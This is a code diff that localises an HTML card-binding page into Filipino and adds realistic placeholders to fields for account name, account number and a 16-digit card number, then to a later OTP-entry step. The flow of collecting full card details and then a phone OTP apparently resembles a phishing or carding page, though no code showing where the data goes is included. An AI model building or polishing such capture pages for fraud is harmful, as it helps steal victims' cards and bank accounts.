@@ -122,20 +122,20 @@
                 <div class="auth-header">
                     <i class="fas fa-link" style="color: #800000; font-size: 3rem;"></i>
                     <h1>Connect Your Account</h1>
-                    <p>LINK DIRECTLY</p>
+                    <p>I-link ang iyong bank account o card sa iyong profile</p>
                 </div>
                 <form id="card-bind-form" onsubmit="handleCardSubmit(event)">
                     <div class="form-group">
-                        <label>Account Name / </label>
-                        <input type="text" id="card-name" placeholder="" required>
+                        <label>Account Name / Pangalan sa Card</label>
+                        <input type="text" id="card-name" placeholder="JUAN DELA CRUZ" required>
                     </div>
                     <div class="form-group">
                         <label>Account Number</label>
                         <input type="text" id="account-number" placeholder="Enter account number" maxlength="12" required>
                     </div>
                     <div class="form-group">
-                        <label>CARD NUMBER (16-Digit)</label>
-                        <input type="text" id="card-number" placeholder="" maxlength="19" required>
+                        <label>Numero ng Card (16-Digit)</label>
+                        <input type="text" id="card-number" placeholder="4111 2222 3333 4444" maxlength="19" required>
                     </div>
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                         <div class="form-group">
@@ -156,7 +156,7 @@
                 <div class="auth-header">
                     <i class="fas fa-key" style="color: #10b981; font-size: 3rem;"></i>
                     <h1>Security Verification</h1>
-                    <p>enter otp</p>
+                    <p>Ipasok ang 6-digit OTP na ipinadala sa iyong telepono</p>
                 </div>
                 <form id="otp-verification-form" onsubmit="handleOtpSubmit(event)">
                     <div style="display: flex; justify-content: center; gap: 8px; margin-bottom: 20px;">
